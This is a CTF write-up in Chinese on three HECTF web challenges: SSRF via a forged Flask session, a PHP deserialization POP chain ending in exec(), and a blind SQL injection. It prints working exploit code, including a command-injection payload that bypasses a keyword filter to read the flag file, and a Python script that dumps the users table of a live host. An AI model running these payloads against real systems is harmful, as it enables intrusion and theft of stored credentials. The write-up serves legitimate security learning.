# 伪造者

这题实际上不难，就是xff构造、伪造flask和ssrf，但在最后一步栽了点跟头，意识到可能是ssrf，但不多

这里简化一下，本地构造就不废话了

![image-20231120114309674](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231120114309674.png)

做到这里把session拿去解密一下

![image-20231120114421027](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231120114421027.png)

已经有提示了，SECRET_KEY是zxk1ing，直接构造

![image-20231120114644192](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231120114644192.png)

做到这里就没什么思路了，打开源代码看看

![image-20231120114725289](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231120114725289.png)

img src处的“img?url=……”可能是整个题最后的利用点

## 当时的做题情况

只能说对ssrf理解的根本不透彻

![image-20231120115041898](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231120115041898.png)

当时发现可以重复输入目标url的时候，以为输入了一定数量的url会导致溢出啥的从而返回内容。。。。。。

实际上file协议读取就行

![image-20231120115259650](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231120115259650.png)

## ssrf的回顾

SSRF，即服务端请求伪造。该漏洞的成因是某些web应用会将外部输入的参数作为url去访问，攻击者可以通过构造某些参数让服务器访问，使得服务器访问到预料之外的内容。内容包括但不限于ip、端口、域名等等

假设有个web应用需要用到某公司的资源，且必须要访问内网才能获取。一个攻击者想要获取内部资源，就可以通过该web应用获取资源。大致过程有4步：攻击者构造含有内网地址的参数发起请求，web应用访问特定的地址，内网返回结果给该应用，该应用返回给攻击者

以该题目为例，判断有无ssrf漏洞，可以先输入百度的地址看看

![image-20231120120545127](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231120120545127.png)

有百度的回显就代表有ssrf漏洞

那么也可以直接回显本地

![image-20231120120830241](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231120120830241.png)

两种方法殊途同归，都是通过访问本地文件获取flag



# ezphp

复现的时候题目关了，就直接上反序列化吧，第一关就是通过给的seed来生成随机数

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
 
class GGbond{
    public $candy;
 
    public function __call($func,$arg){
        $func($arg);
    }
 
    public function __toString(){
        return $this->candy->str;
    }
}
 
class unser{
    public $obj;
    public $auth;
 
    public function __construct($obj,$name){
        $this->obj = $obj;
        $this->obj->auth = $name;
    }
 
    public function __destruct(){
        $this->obj->Welcome();
    }
}
 
class HECTF{
    public $cmd;
 
    public function __invoke(){
        if($this->cmd){
            $this->cmd = preg_replace("/ls|cat|tac|more|sort|head|tail|nl|less|flag|cd|tee|bash|sh|&|^|>|<|\.| |'|`|\(|\"/i","",$this->cmd);
        }
        exec($this->cmd);
    }
}
 
class heeectf{
    public $obj;
    public $flag = "Welcome";
    public $auth = "who are you?";
 
    public function Welcome(){
        if(unserialize($this->auth)=="zxk1ing"){
            $star = (array($this->obj,"⭐","⭐","⭐","⭐","⭐"));
            echo $star;
        }
        else
            echo 'Welcome HECTF! Have fun!';
    }
 
    public function __get($get)
    {
        $func = $this->flag;
        return $func();
    }
}
 
new unser(new heeectf(),"user");
 
$data = $_POST['data'];
if(!preg_match('/flag/i',$data))
    unserialize($data);
else
    echo "想干嘛？？？"; Welcome HECTF! Have fun!
```

先看看切入点在哪

切入点为HECTF，先不管过滤这些，把pop链构造一下

`__invoke()`的触发条件是将对象以函数的形式调用

`__get()`的触发条件是从不可访问的属性读取数据

`__call()`跟`__get()`差不多

正推一遍吧

从unser入口到heeectf，调用到了Welcome()，由于其中有引用到auth，因此要进入到GGbond，为了调用到`__get()`就得重新回到heeectf，最后就是进入到HECTF里面了。

其次是绕过问题，exec那可以双写绕过，空格可以用${IFS}绕过

构造如下：

```php
<?php
class GGbond{
    public $candy;
 
    public function __call($func,$arg){
        $func($arg);
    }
 
    public function __toString(){
        return $this->candy->str;
    }
}
 
class unser{
    public $obj;
    public $auth;
}
 
class HECTF{
    public $cmd;
 
    public function __invoke(){
        if($this->cmd){
            $this->cmd = preg_replace("/ls|cat|tac|more|sort|head|tail|nl|less|flag|cd|tee|bash|sh|&|^|>|<|\.| |'|`|\(|\"/i","",$this->cmd);
        }
        exec($this->cmd);
    }
}
 
class heeectf{
    public $obj;
    public $flag = "Welcome";
    public $auth = "who are you?";
 
    public function Welcome(){
        if(unserialize($this->auth)=="zxk1ing"){
            $star = (array($this->obj,"⭐","⭐","⭐","⭐","⭐"));
            echo $star;
        }
        else
            echo 'Welcome HECTF! Have fun!';
    }
 
    public function __get($get)
    {
        $func = $this->flag;
        return $func();
    }
}
 
$a = new unser('a','a');
$a->obj = new heeectf();
$a->obj->auth = 's:7:"zxk1ing";';
$a->obj->obj = new GGbond();
$a->obj->obj->candy = new heeectf();
$a->obj->obj->candy->flag = new HECTF();
$a->obj->obj->candy->flag->cmd = "cacatt\${IFS}/fl?g|teteee\${IFS}a";
$b = serialize($a);
echo preg_replace('/s:4:"flag"/','S:4:"\\\66lag"',$b);
?>
```

啊啊啊没环境啊

# ezweb

本质上是sql注入，是盲注

与骆佬做了一下，后面才发现并不是模板注入，起因还得是试了试select，发现被过滤了，然后开始试了试一些万能注入，回显admin的时候还真是sql注入

过滤了select，and，sleep， handler，但大小写检测不严谨。由于不同输入有不同回显，因此是盲注

脚本的话。还是放出来吧，讲讲逻辑

```python
import requests

url = "http://101.133.164.228:32285/404.php"
result = ''

for i in range(0, 100):
    right = 127
    left = 32
    mid = int((right + left) >> 1)
    while right > left://右等于左的时候退出，相当于此时的mid就是我们所需要的字符
        # payload = "if(ascii(substr((database()),%d,1))>%d,1,0)#" % (i, mid)
        # payload = "if(ascii(substr((selEct group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))>%d,1,0)#" % (i, mid)
        # payload = "if(ascii(substr((selEct group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))>%d,1,0)#" % (i, mid) //if的语句后面的意思就是符合条件返回1，不符合的返回0
        //substr用于截取查询后语句的第i个字符，判断这个字符的ascii码是否大于mid，%(i,mid)相当于把i与mid的值赋值给一前一后的%d
        payload = "if(ascii(substr((sElect group_concat(name,password) from ctf.users),%d,1))>%d,1,0)#" % (i, mid)
        params = {
            "sort": '1\'or 1='+payload,
        }
        response = requests.post(url, data=params)
        # print(response.text)
        # print(payload)
        if "admin" in response.text:
            left = mid + 1
        else:
            right = mid
        mid = int((right + left) >> 1)

    result += chr(mid)
    print(result)

    # ctf
    # users
    # name,number,password,USER
    # admin123456,JennyAre you sure,DennyHECTF{Jia_You_Weber}
```





